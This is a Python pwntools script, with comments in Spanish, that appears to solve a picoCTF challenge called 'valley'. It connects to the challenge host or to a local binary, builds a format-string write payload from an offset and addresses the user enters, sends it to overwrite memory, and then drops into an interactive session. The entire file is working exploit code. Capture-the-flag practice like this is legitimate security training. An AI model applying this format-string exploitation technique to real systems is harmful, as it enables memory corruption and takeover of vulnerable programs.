from pwn import *

# Datos para conectarse remoto al reto
SERVER = "shape-facility.picoctf.net"
PORT = 51501

# Aqui se van a hacer las pruebas con el binario en local
e = ELF("./valley")
context.binary = './valley'

DEBUG = False

if DEBUG == False:
	s = remote(SERVER, PORT)
else:
	s = process('./valley')
# Respuesta despues de que se hizo la conexion
res = s.recvline().decode()
print(res)

loop = True

while loop:
	# Para introduccir la data
	myInput = input("Enter: ")
	
	if myInput == 'quit':
		loop = False

	if myInput == 'ready':
		# Campos de datos para meter datos para el payload
		offset = int(input("Enter offset: "))
		overwrite_to = int(input("Enter address to overwrite to: "))
		addr_val = int(input("Enter new address to write: "))

		addr_dict = {overwrite_to:addr_val}
		
		payload = fmtstr_payload(offset, addr_dict, write_size='short')
		print("Payload lenght: ", len(payload))
		
		# Enviamos el comando
		s.sendline(payload)
		break
	else:
		s.sendline(myInput.encode())
		res = s.recvline().decode()
		print(res)
end_msg = "exit"
s.sendline(end_msg.encode())
s.interactive()
